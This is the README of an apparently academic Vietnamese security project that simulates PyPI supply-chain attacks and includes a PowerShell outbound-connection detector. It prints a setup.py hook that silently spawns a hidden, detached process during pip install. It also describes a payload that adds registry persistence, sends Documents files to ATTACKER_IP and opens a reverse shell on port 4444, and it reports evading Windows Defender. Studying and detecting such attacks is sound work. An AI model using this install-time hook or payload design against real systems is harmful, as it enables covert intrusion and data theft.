# 🐍 Supply Chain Attack Simulator & EDR Monitor

<div align="center">

![Python](https://img.shields.io/badge/Python-3.12-3776AB?style=for-the-badge&logo=python&logoColor=white)
![PowerShell](https://img.shields.io/badge/PowerShell-5.1-5391FE?style=for-the-badge&logo=powershell&logoColor=white)
![Platform](https://img.shields.io/badge/Attacker-Ubuntu%2024.04-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![Platform](https://img.shields.io/badge/Victim-Windows%2010-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-T1195-red?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Academic%20PoC-yellow?style=for-the-badge)

**Đồ án môn An toàn Thông tin — Đại học Công nghệ Thông tin (UIT), ĐHQG TP.HCM**

[🌍 Bối cảnh](#-bối-cảnh-bài-toán) • [📋 Tổng quan](#-tổng-quan) • [🏗️ Kiến trúc](#️-kiến-trúc-hệ-thống) • [🚀 Triển khai Lab](#-hướng-dẫn-triển-khai-lab) • [📊 Kết quả](#-kết-quả-thực-nghiệm) • [🔵 Detector](#-detector-edr)

</div>

---

> **⚠️ TUYÊN BỐ TRÁCH NHIỆM PHÁP LÝ**
>
> Dự án này được phát triển **hoàn toàn vì mục đích học thuật và giáo dục** trong khuôn khổ Đồ án môn An toàn Thông tin tại UIT - ĐHQG TP.HCM. Toàn bộ thực nghiệm được thực hiện trong môi trường máy ảo VMware, mạng **host-only cô lập, không kết nối internet thật**. **Tuyệt đối không sử dụng các kịch bản này bên ngoài môi trường Lab được cấp phép.**

---

## 🌍 Bối cảnh Bài toán

### Tại sao Supply Chain Attack nguy hiểm?

Hệ thống phòng thủ hiện đại (firewall, EDR, AV) được xây dựng để ngăn kẻ tấn công **tấn công từ ngoài vào**. Nhưng supply chain attack đi theo hướng khác hoàn toàn: **kẻ tấn công không phá cửa — họ đi qua cửa chính bằng giấy mời hợp lệ**.

Mỗi ngày, developer tải hàng chục package từ internet qua `pip install`. Đây là điểm tin tưởng tuyệt đối — không ai kiểm tra mã nguồn của mỗi package trước khi dùng. Kẻ tấn công chỉ cần xâm nhập **một** package trong chuỗi phụ thuộc để kiểm soát hàng nghìn máy tính.

### Các sự kiện thực tế

| Năm | Sự kiện | Quy mô thiệt hại |
|-----|---------|-----------------|
| **2020** | **SolarWinds Orion backdoor** | Backdoor chèn vào build pipeline → 18,000 tổ chức bị nhiễm, bao gồm Microsoft, FireEye, Bộ Tài chính Mỹ |
| **2024** | **XZ Utils backdoor (CVE-2024-3094)** | Backdoor trong thư viện nén C, gần như lọt vào hàng triệu máy chủ Linux toàn cầu |
| **2021** | **Alex Birsan — Dependency Confusion** | Bằng cách publish package cùng tên lên PyPI với version cao hơn, xâm nhập được Apple, Microsoft, PayPal — nhận $130,000 bug bounty |
| **2021** | **ua-parser-js (npm)** | Package 8 triệu lượt tải/tuần bị chiếm → payload đào crypto + đánh cắp thông tin |

### Dependency Confusion — Kỹ thuật trọng tâm của PoC này

Nhiều công ty host package nội bộ trên private registry (Artifactory, Azure DevOps Artifacts, pypiserver...) và cấu hình pip dùng song song với PyPI công khai:

```ini
# pip.conf điển hình của developer tại công ty
[global]
index-url       = https://internal.corpx.com/simple/    # package nội bộ
extra-index-url = https://pypi.org/simple/               # package open source
```

**Lỗ hổng:** pip kiểm tra **cả hai** nguồn và chọn version **cao nhất** — bất kể nguồn nào. Attacker chỉ cần:

```
1. Tìm tên package nội bộ  →  từ GitHub leak, requirements.txt công khai, job posting...
2. Publish lên "public PyPI" với version 99.0.0  →  cao hơn mọi version nội bộ
3. Chờ developer pip install  →  pip tự chọn v99.0.0  →  payload kích hoạt tự động
```

> Developer **không làm gì sai**. Họ chỉ chạy `pip install` như mọi ngày.

### Vấn đề bài toán đặt ra

1. **Chứng minh** cơ chế install-time execution hoạt động thực tế trên Windows 10
2. **Đánh giá** khả năng bypass Windows Defender với payload Python thuần
3. **Xây dựng** Blue Team detector có thể phát hiện hành vi bất thường của tiến trình Python
4. **So sánh** hiệu quả phòng thủ: signature-based AV vs behavioral monitoring

---

## 📋 Tổng quan

Dự án là một **Proof of Concept (PoC)** minh họa toàn bộ vòng đời của kịch bản **Tấn công Chuỗi Cung Ứng Phần Mềm** (Supply Chain Compromise — MITRE ATT&CK **T1195**), bao gồm cả phần tấn công (Red Team) và phòng thủ (Blue Team).

Lấy cảm hứng từ các sự kiện thực tế như **SolarWinds 2020** và **XZ Utils backdoor 2024**, PoC này chứng minh rằng kẻ tấn công không cần phá vỡ hệ thống phòng thủ trực tiếp — chỉ cần đặt mã độc vào đúng điểm mà nạn nhân tin tưởng: **package dependency**.

### Điểm nổi bật

| Hạng mục | Chi tiết |
|---|---|
| 🎯 **3 kịch bản tấn công** | Dependency Confusion, Transitive Dependency, Account Takeover |
| 🔧 **Kỹ thuật kích hoạt** | Module-level execution tại `setup.py` — kích hoạt ngay khi `pip install` đọc metadata |
| 🦠 **Payload** | Persistence (T1547.001) + True Exfiltration (T1041) + Reverse Shell (T1059.001) |
| 🥷 **Evasion** | Living off the Land — chạy dưới `python.exe` hợp pháp, không drop `.exe`, không trigger AMSI |
| 🛡️ **Bypass kết quả** | Windows Defender Full Scan (809,085 files, 48 phút) — **không phát hiện** |
| 🔵 **Phòng thủ** | PowerShell Behavioral Detector — giám sát TCP outbound realtime, có whitelist & audit log |

---

## 🏗️ Kiến trúc Hệ thống

```
supply-chain-attack-simulator/
│
├── 🔴 red_team/
│   ├── infrastructure/
│   │   ├── c2_server.py                # C2 HTTPS server + SSL shell listener
│   │   ├── Dockerfile
│   │   └── welcome.html
│   │
│   ├── malicious_package/              # Kịch bản A: Dependency Confusion
│   │   ├── setup.py                    #   corp-auth-utils v99.0.0 (payload)
│   │   └── corp_auth_utils/
│   │       ├── auth.py                 #   Functions hợp lệ (giống v1.0.0)
│   │       └── marker.py              #   Core payload
│   │
│   ├── scenario4_transitive/           # Kịch bản B: Transitive Dependency
│   │   ├── frontend_package/           #   corpx-logger v1.0.0 (SẠH, depends on backend)
│   │   │   └── corpx_logger/
│   │   └── backend_package/            #   corpx-logging-backend v1.0.0 (ĐỘC)
│   │       └── corpx_logging_backend/
│   │           └── marker.py
│   │
│   └── scenario5_takeover/             # Kịch bản C: Account Takeover
│       ├── legit_v100/                 #   corpx-utils v1.0.0 (bản gốc SẠH)
│       │   └── corpx_utils/
│       └── compromised_v101/           #   corpx-utils v1.0.1 (bản bị chiếm, có payload)
│           └── corpx_utils/
│               └── marker.py
│
├── 🟢 internal_package/                # Package nội bộ hợp lệ (cho kịch bản A)
│   └── corp_auth_utils/                #   corp-auth-utils v1.0.0
│
├── 🔵 blue_team/
│   └── detector.ps1                    # PowerShell Behavioral Detector
│
├── docker-compose.yml                  # 2 registry + C2 server
├── HUONGDAN.md                         # Hướng dẫn demo 3 kịch bản
└── README.md
```

### Sơ đồ 3 kịch bản tấn công

```
Kịch bản A — Dependency Confusion:
  "Internal Registry"         "Public PyPI"               Victim
  corp-auth-utils v1.0.0     corp-auth-utils v99.0.0     pip install corp-auth-utils
          │                          │                      │
          └──── pip thấy cả hai ─────┘                      │
               pip chọn v99.0.0 (cao hơn) ─────────────────►│ setup.py → growl() → PAYLOAD
                                                            │

Kịch bản B — Transitive Dependency:
  Registry                          Victim
  corpx-logger v1.0.0              pip install corpx-logger
  corpx-logging-backend v1.0.0        │
          │                            ├─ cài corpx-logger (SẠH)
          └─ depends on ──────────────►├─ pip auto-install backend (ĐỘC)
                                       │    setup.py → growl() → PAYLOAD
                                       │

Kịch bản C — Account Takeover:
  Registry (đã bị chiếm)           Victim (đã dùng v1.0.0 từ trước)
  corpx-utils v1.0.0 (sạch)       pip install --upgrade corpx-utils
  corpx-utils v1.0.1 (payload)       │
          │                           │
          └─ pip chọn v1.0.1 ────────►│ setup.py → growl() → PAYLOAD
```

### Payload chung — kích hoạt sau khi `pip install`

```
[Attacker Docker]                           [Windows Victim]
      │                                              │
      │                                              │  pip install ...
      │                                              │      │ module-level execution
      │                                              │      ▼
      │                                              │  growl() spawn tiến trình ẩn
      │                                              │  (DETACHED + NO_WINDOW)
      │                                              │      │
      │◀─────────────── HTTPS POST /exfil ───────────│  true_exfiltrate() → T1041
      │◀─────────────── TLS :4444 (shell) ───────────│  reverse_shell()   → T1059
      │                                              │  persist_registry() → T1547
      │                                              │
      ▼                                              ▼
[Nhận dữ liệu exfil]                    [pip hoàn tất bình thường]
[Có interactive shell]                   [Victim không hay biết gì]
```

---

## 🔴 Chi tiết Red Team

### Cơ chế kích hoạt — Module-level Execution

Kỹ thuật cốt lõi: khi `pip install` cần đọc metadata của package (tên, version...), nó **import** `setup.py`. Việc import này thực thi code ở cấp module ngay lập tức — trước cả khi package được cài vào `site-packages`.

```python
# setup.py (đơn giản hóa — dùng chung cho cả 3 kịch bản)
import subprocess, sys

def growl():
    payload_cmd = f'"{sys.executable}" -c "from <package>.marker import run_marker; run_marker()"'
    subprocess.Popen(
        payload_cmd,
        creationflags=0x00000008 | 0x08000000,  # DETACHED_PROCESS | CREATE_NO_WINDOW
        start_new_session=True
    )

growl()  # Kích hoạt ngay khi pip đọc metadata — trước cả khi package được cài
```

### Payload — `marker.py`

#### 1. `persist_registry()` — Persistence (T1547.001)

Ghi Registry key vào `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` để tự khởi động sau reboot.

- **Tại sao HKCU?** Không cần quyền Administrator, ít bị EDR giám sát hơn HKLM, key có tên ngụy trang `WindowsSysUpdater`

#### 2. `true_exfiltrate()` — True Exfiltration (T1041)

Quét `~/Documents` tìm file `.txt`, `.env`, `config.txt` → đọc nội dung → gửi HTTP POST về `ATTACKER_IP:8080`.

| Hành vi | Phiên bản cũ (v1.0) | Phiên bản mới (v1.2) |
|---|---|---|
| **Loại** | Local Staging — T1074 | True Exfiltration — T1041 |
| **Kết quả** | Copy file sang `C:\Temp\Loot` (vẫn trên máy victim) | Dữ liệu gửi qua mạng về C2 server |
| **Attacker phải làm gì?** | Dùng shell gõ thêm lệnh `type` để đọc | Không cần làm gì — dữ liệu tự đến |

#### 3. `reverse_shell()` — Backdoor C2 (T1059.001)

Kết nối **outbound** TCP về `ATTACKER_IP:4444`, tạo interactive shell. Tự reconnect sau 10 giây nếu bị ngắt.

---

## 🔵 Detector EDR

**`blue_team/detector.ps1`** — PowerShell script chạy với quyền Administrator, giám sát realtime các kết nối TCP outbound từ tiến trình Python.

### Tính năng chính

-  **Phát hiện** mọi kết nối `python.exe` ra IP ngoài whitelist
-  **Whitelist** thông minh: loại trừ PyPI CDN (Fastly `151.101.x.x`), localhost
-  **Chống spam**: mỗi kết nối chỉ cảnh báo 1 lần (`$ReportedConnections`)
-  **Audit log** ghi ra `C:\S04Demo\detector_audit.log` với timestamp
-  **"System Clear"** chỉ in 1 lần sau khi threat biến mất

### Demo phát hiện thực tế

```
--- S04 ADVANCED BEHAVIORAL DETECTOR IS RUNNING ---
[08:31:05] ALERT: Suspicious Python Outbound!
[!] PID: 8164 | Path: C:\Users\...\python.exe | Remote: 192.168.157.134
[08:35:22] System Clear: No active threats detected.
```

### Giới hạn đã biết

| Hạn chế | Hướng cải tiến |
|---|---|
| Polling 3 giây = detection gap | Dùng ETW hoặc WMI event-driven thay polling |
| Dễ bypass nếu đổi tên binary | Kiểm tra thêm đường dẫn và chữ ký số |
| False positive với Python hợp lệ | Mở rộng whitelist, dùng DNS-based filtering |
| Cần quyền Administrator | Ghi rõ trong deployment guide |

---

##  Hướng dẫn Triển khai Lab

> Chi tiết đầy đủ xem **[HUONGDAN.md](HUONGDAN.md)** — hướng dẫn từng bước cho cả 3 kịch bản.

### Yêu cầu

| Thành phần | Yêu cầu |
|-----------|---------|
| Máy Attacker | Docker Desktop, LAN |
| Máy Victim | Windows 10+, Python 3.12+ |
| Mạng | 2 máy cùng LAN |

### Quick Start

```powershell
# Trên máy Attacker
cd supply-chain-attack-simulator
docker compose up -d --build
# → 3 container: internal-registry(:8000), public-registry(:9000), c2(:8080+4444)

# Trên máy Victim (ví dụ Kịch bản A)
pip install corp-auth-utils `
    --index-url http://ATTACKER_IP:8000/simple/ `
    --extra-index-url http://ATTACKER_IP:9000/simple/ `
    --trusted-host ATTACKER_IP
# → pip chọn v99.0.0 từ "public" → payload kích hoạt
```

---

## 📊 Kết quả Thực nghiệm

### Bypass Windows Defender

| Thành phần | Phiên bản |
|---|---|
| Hệ điều hành | Windows 10 Enterprise LTSC 21H2 (Build 19044.7184) |
| Windows Defender | Antimalware Client v4.18.26030.3011 |
| Security Intelligence | Antivirus v1.449.166.0 |
| Loại scan | **Full Scan** — 809,085 files, 48 phút 21 giây |
| **Kết quả** |  **Không phát hiện mối đe dọa nào** |

### Tại sao bypass được — 5 lớp evasion

| Kỹ thuật | Cơ chế | Loại |
|---|---|---|
| **Trusted Process (python.exe)** | AV tin tưởng interpreter hợp pháp | Tự nhiên (LotL) |
| **Không có binary dropper** | Không tạo `.exe` mới → không trigger file scan | Tự nhiên |
| **Module-level execution** | Payload chạy trong context import pip | Thiết kế |
| **DETACHED + NO_WINDOW** | Tiến trình ẩn hoàn toàn, thoát khỏi pip parent | Chủ động |
| **Không dùng AMSI-hooked API** | `subprocess.Popen` → Win32 `CreateProcess` trực tiếp, AMSI không scan | Thiết kế |

### Vòng đời Incident Response

```
1. Detector phát hiện python.exe → ATTACKER_IP:4444 [ALERT]
2. pip uninstall ...                ←  KHÔNG đủ! Tiến trình vẫn sống
3. taskkill /PID ... /F             ←  Kill tiến trình thực sự
4. Detector: "System Clear"         ←  Xác nhận sạch
⚠️  Exfiltration đã hoàn tất — dữ liệu trên C2 không thể thu hồi
```

---

## 📚 Tài liệu tham khảo

- [MITRE ATT&CK T1195 — Supply Chain Compromise](https://attack.mitre.org/techniques/T1195/)
- [MITRE ATT&CK T1547.001 — Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [MITRE ATT&CK T1041 — Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)
- [MITRE ATT&CK T1059.001 — Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [PEP 517 — A build-system independent format for source trees](https://peps.python.org/pep-0517/)
- [pypiserver — Minimal PyPI server](https://github.com/pypiserver/pypiserver)

---

## 👨‍💻 Tác giả

**Trần Hồng Quân**
Sinh viên Đại học Công nghệ Thông tin (UIT) — ĐHQG TP.HCM
Chuyên ngành: An toàn Thông tin

---

<div align="center">
<sub>Dự án này được tạo ra cho mục đích giáo dục. Hãy sử dụng kiến thức một cách có trách nhiệm.</sub>
</div>
